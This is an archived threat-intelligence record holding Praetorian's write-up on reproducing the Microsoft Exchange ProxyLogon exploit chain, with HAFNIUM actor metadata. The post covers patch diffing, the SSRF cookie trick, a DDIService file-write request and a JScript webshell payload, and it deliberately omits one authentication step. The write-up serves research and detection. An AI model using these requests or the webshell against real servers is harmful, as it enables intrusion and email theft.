{
    "id": "03934742-887f-45dd-9286-4ee6464618e6",
    "created_at": "2023-01-12T14:59:04.142577Z",
    "updated_at": "2025-03-27T02:12:03.872035Z",
    "deleted_at": null,
    "sha1_hash": "345423c39ce745e304fde259b7086722d2a04f8c",
    "title": "2021-03-09 - Reproducing the Microsoft Exchange Proxylogon Exploit Chain",
    "authors": "",
    "file_creation_date": "2022-05-29T01:25:40Z",
    "file_modification_date": "2022-05-29T01:25:40Z",
    "file_size": 4399524,
    "plain_text": "# Reproducing the Microsoft Exchange Proxylogon Exploit Chain\n\n**praetorian.com/blog/reproducing-proxylogon-exploit/**\n\nMarch 9, 2021\n\n## Introduction\n\nIn recent weeks, Microsoft has detected multiple 0-day exploits being used to attack onpremises versions of Microsoft Exchange Server in a ubiquitous global attack. ProxyLogon is\nthe name given to CVE-2021-26855, a vulnerability on Microsoft Exchange Server that\nallows an attacker to bypass authentication and impersonate users. In the attacks observed,\nthreat actors used this vulnerability to access on-premises Exchange servers, which enabled\naccess to email accounts, and install additional malware to facilitate long-term access to\nvictim environments.\n\nThe Praetorian Labs team has reverse engineered the initial security advisory and\nsubsequent patch and successfully developed a fully functioning end-to-end exploit. This\npost outlines the methodology for doing so but with a deliberate decision to omit critical\nproof-of-concept components to prevent non-sophisticated actors from weaponizing the\nvulnerability. While we have elected to refrain from releasing the full exploit, we know a\ncomplete exploit will be released by the security community shortly. Once the remaining\n\n\n-----\n\nsteps are public knowledge, we will more openly discuss our end-to-end solution. We believe\nthe hours/days in between will provide additional time for our customers, companies, and\ncountries alike to patch the critical vulnerability.\n\nMicrosoft has rapidly developed and published scripts, indicators, and emergency patches to\naid in the mitigation of these vulnerabilities. Microsoft Security Response Center has\n[published a blog post detailing these mitigation measures here. Of note, the URL rewrite](https://msrc-blog.microsoft.com/2021/03/05/microsoft-exchange-server-vulnerabilities-mitigations-march-2021/)\nmodule successfully prevents exploitation without requiring emergency patching, and should\nprove an effective rapid countermeasure to Proxylogon. However, as discussed elsewhere,\nexploitation of Proxylogon has been so widespread that operators of externally facing\nExchange servers must turn to incident response and eviction.\n\n## Methodology\n\nFor the reverse engineering process we implemented the following steps to allow us to\nperform both static and dynamic analysis of Exchange and its security patches:\n\n**Diff: review differences between vulnerable version and patched version**\n**Test: deploy a full test environment of the vulnerable version**\n**Observe: instrument deployment to gain knowledge of typical network communication**\n**Investigate: iterate over each CVE, connect patch diff to network traffic, and fabricate**\nproof-of-concept exploits\n\n## Diff\n\nBy examining the differences (diffing) between a pre-patch binary and post-patch binary we\nwere able to identify exactly what changes were made. These changes were then reverse\nengineered to assist in reproducing the original bug.\n\n[Microsoft’s update catalog was helpful when grabbing patches for diffing. A quick search for](https://www.catalog.update.microsoft.com/)\nthe relevant software version returned a list of security patch roll-ups that we used to\ncompare the latest security patch against its predecessor. For example, by searching for\n[“Security Update For Exchange Server 2013 CU23” we identified patches for a specific](https://www.catalog.update.microsoft.com/Search.aspx?q=Security%20Update%20For%20Exchange%20Server%202013%20CU23)\nversion of Exchange. Exchange 2013 was chosen here because it was the smallest set of\npatches for a version of Exchange vulnerable to CVE-2021-26855 and therefore easiest to\ndiff.\n\n\n-----\n\n_The Microsoft Update Catalog will helpfully sort by date, so the desired files are the top 2_\n_entries_\n\nTo begin, we downloaded the latest (3/2/2021) and the previous (12/2/2021) security update\nrollup. By extracting the .msp file from the .cab file, and unpacking the .msp file using 7zip,\nwe were left with two folders of binaries to compare.\n\n_The .msp update contains a few hundred binaries - most of which are .NET applications_\n\n[Because most of the binaries were .NET applications we used dnSpy to decompile each](https://github.com/dnSpy/dnSpy)\nbinary to a series of source files. To speed up analysis we automated decompilation and\nleveraged the comparison functionality of source control by uploading each version to a\nGitHub repository as separate commits for comparison.\n\n_Diffing on GitHub can help important changes stand out at a glance_\n\n[An alternative diffing option that we also found helpful was Telerik’s JustAssembly. It was a](https://www.telerik.com/justassembly)\nlittle bit slower for observing the actual file differences, but was helpful in immediately\nidentifying where code had been added or removed.\n\n\n-----\n\n_JustAssembly succinctly shows changes for an entire dll_\n\nWith this preparation complete, we needed to spin-up a target Exchange server to test\nagainst.\n\n## Test\n\n[To begin, we set up a standard domain controller using the ADDSDeployment module from](https://docs.microsoft.com/en-us/powershell/module/addsdeployment/?view=win10-ps)\nMicrosoft. We then downloaded the relevant Exchange installer (ex:\n[https://www.microsoft.com/en-us/download/details.aspx?id=58392 for Exchange 2013 CU23)](https://www.microsoft.com/en-us/download/details.aspx?id=58392)\nand performed the standard installation process.\n\n[For an Azure-based Exchange environment, we followed the steps outlined here, swapping](https://docs.microsoft.com/en-us/exchange/plan-and-deploy/deploy-new-installations/create-azure-test-environments?view=exchserver-2019)\nthe installer downloaded in step 8 of `Install Exchange` with the correct Exchange installer\nfound in the above link. Additionally, we modified the PowerShell snippet in the server\nprovisioning script to spin up a 2012-R2 Datacenter server instead of the 2019 Server\nversion.\n```\n          $vm=Set-AZVMSourceImage -VM $vm -PublisherName MicrosoftWindowsServer\n-Offer `WindowsServer -Skus 2012-R2-Datacenter -Version \"latest\"\n\n```\nThis allowed for a quick deployment of a standalone Domain Controller and Exchange\nserver, with a network security group in place to prevent unwanted Internet-based\nexploitation attempts.\n\n## Observe\n\n\n-----\n\nMicrosoft Exchange is composed of several backend components which communicate with\none another during normal operation of the server. From the user perspective, a request to\nthe frontend Exchange server will flow through IIS to the Exchange HTTP Proxy, which\nevaluates mailbox routing logic and forwards the request on to the appropriate backend\nserver. This is shown in the diagram below.\n\n_Microsoft Exchange 2016 Client Access Protocol Architecture diagram_\n_(https://docs.microsoft.com/en-us/exchange/architecture/architecture#client-access-protocol-_\n_architecture)_\n\nWe were interested in observing all traffic sent from the HTTP Proxy to the Exchange Back\nEnd as this should include many example requests from real services to help us better\nunderstand the source code and from requests in our exploit. Exchange is deployed on IIS,\n\n\n-----\n\nso we made a simple change to the Exchange Back End binding to update the port from 444\nto 4444. Next, we deployed a proxy on port 444 to forward packets to the new bind address.\n\nThe Exchange HTTP Proxy validates the TLS certificate of the Exchange Back End, so for\nour proxy to be useful, we wanted to dump the “Microsoft Exchange” certificate from our test\nmachine’s local certificate store. Since this certificate’s private key is marked as nonexportable during the Exchange installation process, we extracted the key and certificate\nusing mimikatz:\n```\n          mimikatz# privilege::debugmimikatz# crypto::certificates /export\n/systemstore:LOCAL_MACHINE\n\n```\n\n-----\n\n_Using mimikatz to extract the Exchange certificate and key from our test machine._\n\nWith the certificate and key in hand, we used a tool similar to socat, a multi-purpose network\nrelaying tool, to listen on port 444 using the Exchange certificate and relay connections to\nport 4444 (the actual Exchange Back End). The socat command might look like:\n```\n          # export the certificate and private key (password mimikatz)openssl\npkcs12 -in 'CERT_SYSTEM_STORE_LOCAL_MACHINE_My_1_Microsoft Exchange.pfx' -nokeys -out\nexchange.pemopenssl pkcs12 -in 'CERT_SYSTEM_STORE_LOCAL_MACHINE_My_1_Microsoft\nExchange.pfx' -nocerts -out exchange.pem# launch socat, listening on port 444,\nforwarding to port 4444socat -x -v openssllisten:4444,cert=exchange.pem,key=exchange-key.pem,verify=0,reuseaddr,fork opensslconnect:127.0.0.1:444,verify=0\n\n```\nWith our proxy configured, we began using Exchange as normal to generate HTTP requests\nand learn more about these internal connections. Additionally, several backend server\nprocesses sent requests to port 444, allowing us to observe periodic health checks,\nPowershell remoting requests, etc.\n\n## Investigate\n\nWhile each CVE is different, our general methodology for triaging a particular CVE was\ncomposed of five phases:\n\n1. Reviewing indicators\n2. Reviewing patch diff\n\n\n-----\n\n3. Connecting the indicators to the diff\n4. Connecting these code paths to proxied traffic\n5. Crafting requests to trigger these code paths\n6. Repeat\n\n### Warming up with CVE-2021-26857\n\n[“CVE-2021-26857 is an insecure deserialization vulnerability in the Unified Messaging](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26857)\nservice. Insecure deserialization is where untrusted user-controllable data is deserialized by\na program. Exploiting this vulnerability gave HAFNIUM the ability to run code as SYSTEM on\nthe Exchange server.” – [via Microsoft’s bulletin about the HAFNIUM exploits](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\n\nWhile this particular vulnerability was ultimately unnecessary to obtain remote code\nexecution on the Exchange server, it provided a straightforward example of how patch diffing\ncan reveal the details of a bug. The advisory above also explicitly identified the Unified\nMessaging service as a potential target – which significantly helped to narrow the initial\nsearch space.\n\nThe Exchange binary packages were named fairly clearly – proxying functionality lived in\nMicrosoft.Exchange.HttpProxy.*, log uploading lived in Microsoft.Exchange.LogUploader,\nand Unified Messaging code lived in Microsoft.Exchange.UM.*. When diffing files we don’t\nalways have clear indicators in the file names, but there was no reason not to use this during\nour investigation.\n\n_The JustAssembly diff of these dlls indicates the root cause fairly clearly_\n\n\n-----\n\nThe diffed classes here showed that a `Base64Deserialize function had been removed`\nand a `contactInfoDeserializationAllowList property had been added. .NET`\nhistorically has struggled with deserialization issues, so seeing these kinds of changes\nstrongly suggested the removal of vulnerable code and the addition of protections against\n.NET deserialization exploitation. Examining Base64Deserialize confirms this:\n\n_The removed function passes the output of a base64 string to a BinaryFormatter’s_\n_Deserialize_\n\nBefore the patch, this unsafe method was invoked from\n```\nMicrosoft.Exchange.UM.UMCore.PipelineContext.FromHeaderFile as we observed\n\n```\nby examining the diff:\n\n_The ContactInfo property of a serialized PipelineContext can be used to trigger the_\n_vulnerability_\n\nThe updated version of this function included much more code for properly verifying types\nbefore deserializing them.\nEssentially, this patch removed functionality that is vulnerable to a .NET deserialization\n[attack which can be exploited using tools like ysoserial.net. While the attack path here is](https://github.com/pwntester/ysoserial.net)\nfairly straightforward, Unified Messaging is not always enabled on servers and as a result our\nproof of concept exploit relied on CVE-2021-27065, discussed below.\n\n\n-----\n\n### Server-Side Request Forgery (CVE-2021-26855)\n\nSince all of the remote code execution vulnerabilities require an authentication bypass, we\nturned our attention to the Server-Side Request Forgery (SSRF). Microsoft published the\nfollowing Powershell command to search for indicators related to this vulnerability:\n```\n          Import-Csv -Path (Get-ChildItem -Recurse -Path\n\"$env:PROGRAMFILES\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy\" -Filter\n'*.log').FullName `| Where-Object { $_.AuthenticatedUser -eq '' -and\n$_.AnchorMailbox -like 'ServerInfo~*/*' } | select DateTime, AnchorMailbox\n\n```\nAdditionally, Volexity published the following URLs related to SSRF exploitation:\n```\n/owa/auth/Current/themes/resources/logon.css/owa/auth/Current/themes/resources/.../ecp\n char>.js\n\n```\nUsing these indicators, we searched the patch diff for related terms (including strings like\nhost, hostname, fqdn, etc.) and discovered interesting changes in\n```\nMicrosoft.Exchange.FrontEndHttpProxy.HttpProxy namespace. This led us to also\n\n```\ndiscover a relevant diff in the `BackEndServer class used by`\n```\nBEResourceRequestHandler .\n\n```\n_Patch diff related to ServerInfo / authentication / host / fqdn._\n\n\n-----\n\n_Patch diff of the BackEndServer class used by BEResourceRequestHandler._\n\nNext, we traced calls to `BEResourceRequestHandler and found this relevant path from the`\n```\nSelectHandlerForUnauthenticatedRequest method in ProxyModule .\n\n```\n_Minified code showing path to hit BEResourceRequestHandler._\n\nLastly, we evaluated the `CanHandle method of` `BEResourceRequestHandler and found`\nthat it required a URL with the ECP “protocol” (e.g. /ecp/), a `X-BEResource cookie, and a`\nURL that ended with a static file type extension (e.g. js, css, flt, etc.). Since this code was\nimplemented in the HttpProxy, the URL did not need to be valid, which explained the fact\nthat some indicators simply used `/ecp/y.js, a non-existent file.`\nThe `X-BEResource cookie was parsed in` `BackEndServer.FromString, which effectively`\nsplit the string on `\"~\" and assigned the first element to an “fqdn” for the backend and`\nparsed the second as an integer version.\n\nWe then traced the usage of this `BackEndServer object and discovered it was used in the`\n```\nProxyRequestHandler to determine which Host to send the proxied request to. The URI\n\n```\nwas constructed in `GetTargetBackEndServerUrl via a` `UriBuilder, which is a native`\n\n\n-----\n\n.NET class.\n\n_Minified code showing relevant methods from ProxyRequestHandler._\n\nAt this point, we could theoretically control the Host used for these backend connections by\nsetting a specific header and sending requests to a “static” file in /ecp. However, simply\ncontrolling the Host is not enough to call arbitrary endpoints on the Exchange Back End. For\nthis, we looked inside the .NET source code itself to see how UriBuilder is implemented.\n\n\n-----\n\n_ToString method from the UriBuilder reference source code._\n\nAs shown in the snippet above, the ToString method of UriBuilder (which is used to construct\nURIs) performs simple string concatenation with our inputs. Therefore, if we set Host to be\n```\n\"example.org/api/endpoint/#\", we effectively gain full control over the target URL.\n\n```\nWith this information, we had enough to demonstrate the SSRF with the following HTTP\nrequest…\n\n_Failed SSRF attempt to example.org due to Kerberos host mismatch._\n\nAlas! Our SSRF attempt “failed” due to a NegotiateSecurityContext error\n\n\n-----\n\ncommunicating with example.org. As it turned out, this error was key to our understanding of\nthe SSRF, as it demonstrated the fact that the HTTP Proxy was attempting to authenticate\nvia Kerberos to the backend server. By setting the hostname to the Exchange server\nmachine name, the Kerberos authentication succeeds and we can access endpoints as `NT`\n```\nAUTHORITY\\SYTEM . With this information, we had enough to demonstrate SSRF with the\n\n```\nfollowing HTTP request…\n\n_Failed SSRF attempt due to backend authentication check._\n\nAlas! Again! The backend server rejected our request for some reason. Tracing this error, we\neventually discovered the `EcpProxyRequestHandler.AddDownLevelProxyHeaders`\nmethod, which is only called if `ProxyToDownLevel is set to true in the`\n```\nGetTargetBackEndServerUrl method. This method checked that the user was\n\n```\nauthenticated and returned an HTTP 401 error if they were not.\nThankfully, we can prevent `GetTargetBackEndServerUrl from setting this value by`\nmodifying the server version in our cookie. If the version was greater than\n```\nServer.E15MinVersion, ProxyToDownLevel remained false. With this change in place,\n\n```\nwe successfully authenticated to a backend service (the autodiscover service).\n\n\n-----\n\n_Successful SSRF to the autodiscover endpoint._\n\nWhile reviewing the code paths above, we discovered an additional SSRF in the OWA proxy\nhandler. These requests were sent without Kerberos authentication and therefore could be\ntargeted to arbitrary servers as shown below.\n\n\n-----\n\n_Successful SSRF attempt to example.org via X-AnonResource cookie._\n\nAt this point, we had enough information to forge requests to some backend services. We\nare not publishing information on how to properly authenticate to more sensitive services\n(e.g. /ecp) as this information is not publicly available.\n\n### Arbitrary File Write (CVE-2021-27065)\n\nWith SSRF in hand, we turned our attention to remote code execution. Before we began\npatch diffing, our first clue on this vulnerability came from the indicators published by\nMicrosoft and Volexity. Namely, this Powershell command to search the ECP logs for\nindicators of compromise:\n```\n          Select-String -Path\n\"$env:PROGRAMFILES\\Microsoft\\ExchangeServer\\V15\\Logging\\ECP\\Server\\*.log\" `-Pattern\n'Set-.+VirtualDirectory'\n\n```\nAdditionally, the Volexity blog post described requests to\n```\n/ecp/DDI/DDIService.svc/SetObject as related to exploitation. With these two facts in\n\n```\nhand, we searched our diff for anything related to file I/O in the ECP or DDI classes. This\nquickly came back with a result for the `WriteFileActivity class in`\n```\nMicrosoft.Exchange.Management.ControlPanel.DIService . The “control panel” is the\n\n```\nuser-facing name for ECP and DDIService is directly in the indicator URL. As shown in the\ndiff below, the old functionality wrote a file with a user-controlled name directly to disk. In the\nnew functionality, the code appends a “.txt” file extension if not already present. Knowing that\nthe general exploit involved writing an ASPX webshell to the server, the\n```\nWriteFileActivity seemed like a prime candidate for exploitation.\n\n```\n\n-----\n\n_Patch diff of WriteFileActivity.cs_\n\nIf we search the Exchange installation directory for WriteFileActivity, we see it used in several\nXAML files within Exchange Server\\V15\\ClientAccess\\ecp\\DDI.\n\n_Code snippet from ResetOABVirtualDirectory.xaml_\n\nAfter examining the XAML files and reviewing the ECP functionality in the Exchange web UI,\nwe determined that the SetObjectWorkflow above described a series of steps to be executed\nserver-side (including Powershell cmdlet execution) to perform a specific operation.\n\n\n-----\n\n_ECP user interface showing the configuration options for ResetVirtualDirectory._\n\nBy submitting a sample ResetVirtualDirectory request, we observed that the Exchange\nserver wrote a pretty-printed configuration of the VirtualDirectory to the specified path,\nremoved the VirtualDirectory, and recreated it. This configuration file contained several\nproperties from the directory and could be written to any directory on the system with an\narbitrary extension. A screenshot of the request and resulting file are shown below.\nExample HTTP request to the DDIService to reset the OAB VirtualDirectory:\n```\n          POST /ecp/DDI/DDIService.svc/SetObject?\nschema=ResetOABVirtualDirectory&msExchEcpCanary={csrf} HTTP/1.1Host: localhostCookie:\nmsExchEcpCanary={csrf};Content-Type: application/json{\"identity\": {\"__type\":\n\"Identity:ECP\",\"DisplayName\": \"OAB (Default Web Site)\",\"RawIdentity\": \"cf64594f-d73944a4-aa70-3fbd158625e2\"},\"properties\": {\"Parameters\": {\"__type\":\n\"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\",\"FilePathName\":\n\"C:\\\\VirtualDirectory.aspx\"}}}\n\n```\n\n-----\n\n_File exported by the DDIService showing all properties of the VirtualDirectory._\n\n\n-----\n\n_ECP web UI showing editable parameters for a VirtualDirectory._\n\nThe following parameters were exposed in the UI for editing a VirtualDirectory. Notably, the\nInternal URL and External URL were exposed in the UI, described in the XAML as\nparameters, and written to the file at our arbitrary path. This combination of factors allowed\nan attacker controlled input to reach an arbitrary path, which is the necessary primitive to\nenable a webshell.\nAfter some experimentation, we determined that the Internal/External URL fields was\npartially validated by the server. Namely, the server validated the URI scheme, hostname,\nand imposed a maximum length of 256 bytes. Additionally, the server “percent encoded” any\npercent signs in the payload (e.g. “%” become “%25”). As a result, a classic ASPX code\nblock like `<% code %> was transformed into` `<%25 code %25> which is invalid. However,`\nother metacharacters (e.g. < and >) were not encoded, allowing injection of a URL like the\nfollowing:\n```\n          http://o/#<script language=\"JScript\" runat=\"server\">function\nPage_Load(){eval(Request[\"mlwqloai\"],\"unsafe\");}</script>\n\n```\nAfter resetting the VirtualDirectory, this URL was embedded in the export and saved to the\n\n\n-----\n\npath of our choosing, granting remote code execution on the Exchange server.\n\n_Using webshell to execute commands on compromised Exchange server._\n\n### Leaking the Backend + Domain\n\nThe complete exploit chain requires the Exchange server backend and domain. In\n[Crowdstrike’s blog post about the attack they posted a full log of the attack being sprayed](https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/)\nacross the Internet. In this log, the first call was to an /rpc/ endpoint:\n\n_The initial request hits the /rpc/ exposed by Exchange_\n\n[This initial request must be unauthenticated, and is likely utilizing RPC over HTTP which](https://docs.microsoft.com/en-us/previous-versions/tn-archive/aa996225(v=exchg.65)?redirectedfrom=MSDN)\nessentially exposes NTLM authentication through the endpoint. RPC over HTTP is itself a\nfairly complicated protocol which is thoroughly detailed via Microsoft’s open specification\ninitiative.\n[As attackers, we were interested in parsing the NTLM Challenge message that is returned to](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786)\n[us after sending an NTLM Negotiation message. This challenge message contains a number](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2)\nof [AV_PAIR structures that contain the information we are interested in – specifically](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/83f5e789-660d-4781-8491-5f8c6641f75e)\n\n\n-----\n\n```\nMsvAvDnsComputerName (the backend server name) and MsvAvDnsTreeName (the domain\n\n```\nname).\n[Impacket’s](https://github.com/SecureAuthCorp/impacket) [http.py already contains code to perform this negotiation to generate a](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/http.py#L143)\nnegotiation message and then parse the challenge response into AV_PAIR structures. The\nrequest and response ends up looking like:\n```\n          RPC_IN_DATA /rpc/rpcproxy.dll HTTP/1.1Host:\nfrontend.exchange.contoso.comUser-Agent: MSRPCAccept: application/rpcAccept-Encoding:\ngzip, deflateAuthorization: NTLM TlRMTVNTUAABAAAABQKIoAAAAAAAAAAAAAAAAAAAAAA=ContentLength: 0Connection: close\n          HTTP/1.1 401 UnauthorizedServer: Microsoft-IIS/8.5request-id:\n72dce261-682e-4204-a15a-8055c0fd93d9Set-Cookie: ClientId=IRIFSCHPJ0YLFULO9MA;\nexpires=Tue, 08-Mar-2022 22:48:47 GMT; path=/; HttpOnlyWWW-Authenticate: NTLM\nTlRMTVNTUAACAAAACAAIADgAAAAFAomiVN9+140SRjMAAAAAAAAAAJ4AngBAAAAABgOAJQAAAA9DAE8AUgBQAA\nAuthenticate: NegotiateWWW-Authenticate: Basic\nrealm=\"frontend.exchange.contoso.com\"X-Powered-By: ASP.NETX-FEServer: frontendDate:\nMon, 08 Mar 2021 22:48:47 GMTConnection: closeContent-Length: 0\n\n```\nThe base64 encoded hash can be parsed using Impacket to show the leaked domain\ninformation.\n\n_Leaked domain information embedded in the WWW-Authenticate NTLM Challenge_\n\nThe recovered `AV_PAIR data is encoded as Windows Unicode and maps a specific`\n```\nAV_ID to a value. AV_IDs are constants that map to specific content, for example, we\n\n```\nwant to grab the strings for 3 (the backend hostname) and 5 (the domain).\n\n_Mappings for the AV_PAIR structures to numbers in the calculated data_\n\nThe information posted here resolves that the backend value is ex.corp.contoso.com and the\n\n\n-----\n\ndomain is corp.contoso.com. These are the values needed to abuse the SSRF vulnerability\ndiscussed earlier.\n\n### Homework\n\nAs described elsewhere, we have omitted certain exploit details to prevent ease of\nexploitation. The mechanism through which the exploit authenticates to ECP endpoints as\narbitrary users is left as an exercise to the reader. We will release further details on this in a\nfollow-up blog post once sufficient time has elapsed.\n\n## Detection\n\n[Microsoft’s Threat Intel Center (MSTIC) has already provided excellent indicators and](https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/)\n[detection scripts which anyone with an on premise Exchange server should use. To](https://github.com/microsoft/CSS-Exchange/tree/main/Security)\ndetermine if there is a compromise we recommend SOCs, MSSPs, and MDRs take the\nfollowing steps:\n\n1. Ensure all endpoint protection products are updated and functioning. While the exploit\n\nitself may not have a large quantity of IoCs published to detection engines yet, post\nexploitation activity can be easily detected with modern tooling.\n2. Run the “TestProxyLogon.ps1” script from Microsoft’s github linked above across all\n\nExchange servers. From our experience with the weaponization of the exploit the script\nshould detect any evidence of an exploited system.\n3. Double check the configuration of the Servers in question, scheduled tasks, autoruns\n\netc, are all places that an attacker could be hiding after gaining initial access. Ensure\nthe Audit Process Creation audit policy and PowerShell logging are enabled for\nExchange servers and check for suspicious commands and scripts. Discrepancies\nshould be verified, reported, and remediated ASAP.\n\nAs we continue our exploration of these vulnerabilities, we intend to publish additional\nmaterial on detecting any evidence of this exploit in your environment.\n\n### Post-Exploitation\n\n[Previous work by Sean Metcalf and](https://adsecurity.org/?p=4119) [Trimarc Security details the high level of permissions](https://www.trimarcsecurity.com/single-post/2019/02/12/Mitigating-Exchange-Permission-Paths-to-Domain-Admins-in-Active-Directory)\nthat often accompany on-premise Exchange installations. When configured in this way, an\nattacker with control of an Exchange server can easily use this access for domain-wide\ncompromise with an ACL abuse. Affected environments can determine if site-wide\ncompromise should be suspected by examining the ACLs applied to the root domain object,\nand observing whether or not vulnerable Exchange resources fall into these groups. We\nhave adapted the PowerShell snippet in the Trimarc post to more specifically filter on the\nExchange Windows Permissions and Exchange Trusted Subsystem groups. If your\nenvironment has added Exchange resources to custom groups or groups outside of these,\nyou will need to adapt the script accordingly.\n\n\n-----\n\n```\n          import module ActiveDirectory$ADDomain  $DomainTopLevelObjectDN \n(Get-ADDomain $ADDomain).DistinguishedNameGet-ADObject -Identity\n$DomainTopLevelObjectDN -Properties * | select -ExpandProperty nTSecurityDescriptor |\nselect -ExpandProperty Access | select\nIdentityReference,ActiveDirectoryRights,AccessControlType,IsInherited | Where-Object\n{($_.IdentityReference -like \"*Exchange Windows Permissions*\") -or\n($_.IdentityReference -like \"*Exchange Trusted Subsystem*\")} | Where-Object\n{($_.ActiveDirectoryRights -like \"*GenericAll*\") -or ($_.ActiveDirectoryRights -like\n\"*WriteDacl*\")}\n\n## Acknowledgements\n\n```\nReproduction of this bug did not happen in a vacuum -our development process relied on the\npublished works of the original researchers, incident responders, and other security\nresearchers who also worked to reproduce these bugs. Our thanks and appreciation go out\nto:\n\n[DEVCORE-Who found the original bug](https://devco.re/)\n[Volexity-Who identified the bug in the wild](http://volexity.com/)\n[@80vul-The first user seen to reproduce the exploit chain](https://twitter.com/80vul/)\n[Rich Warren (@buffaloverflow)-Who we actively worked with while investigating](http://twitter.com/buffaloverflow)\n[Crowdstrike-Who published additional information about active exploitation in the wild](https://www.crowdstrike.com/)\n[Microsoft-Who quickly published indicators and patches](https://www.microsoft.com/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-09 - Reproducing the Microsoft Exchange Proxylogon Exploit Chain.pdf"
    ],
    "report_names": [
        "2021-03-09 - Reproducing the Microsoft Exchange Proxylogon Exploit Chain.pdf"
    ],
    "threat_actors": [
        {
            "id": "529c1ae9-4579-4245-86a6-20f4563a695d",
            "created_at": "2022-10-25T16:07:23.702006Z",
            "updated_at": "2025-03-27T02:02:09.93109Z",
            "deleted_at": null,
            "main_name": "Hafnium",
            "aliases": [
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "ETDA:Hafnium",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7c969685-459b-4c93-a788-74108eab6f47",
            "created_at": "2023-01-06T13:46:39.189751Z",
            "updated_at": "2025-03-27T02:00:03.017103Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "ATK233",
                "G0125",
                "Operation Exchange Marauder",
                "Red Dev 13",
                "Silk Typhoon"
            ],
            "source_name": "MISPGALAXY:HAFNIUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535544,
    "ts_updated_at": 1743041523,
    "ts_creation_date": 1653787540,
    "ts_modification_date": 1653787540,
    "files": {
        "pdf": "https://archive.orkl.eu/345423c39ce745e304fde259b7086722d2a04f8c.pdf",
        "text": "https://archive.orkl.eu/345423c39ce745e304fde259b7086722d2a04f8c.txt",
        "img": "https://archive.orkl.eu/345423c39ce745e304fde259b7086722d2a04f8c.jpg"
    }
}